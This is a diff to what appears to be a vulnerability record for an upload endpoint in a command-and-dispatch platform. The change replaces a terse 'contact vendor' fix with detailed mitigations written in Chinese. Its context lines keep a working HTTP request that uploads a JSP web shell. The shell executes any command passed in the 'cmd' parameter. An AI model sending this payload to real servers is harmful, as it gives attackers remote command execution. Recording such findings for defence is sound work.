@@ -9,7 +9,7 @@ detail = """POST /upload HTTP/1.1 Host: target Content-Type: multipart/form-data
 Content-Disposition: form-data; name="file"; filename="shell.jsp"
 <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
 ------Boundary--"""
-fix = "联系厂商升级"
+fix = "联系可视化融合指挥调度平台厂商获取安全补丁；对 /upload 接口添加文件类型白名单校验；限制上传文件路径；Web 目录禁止执行动态脚本；限制该接口仅允许内网可信 IP 访问。"
 date = 20260415
 label = "nday"
 cve = "TVD-2026-08343"
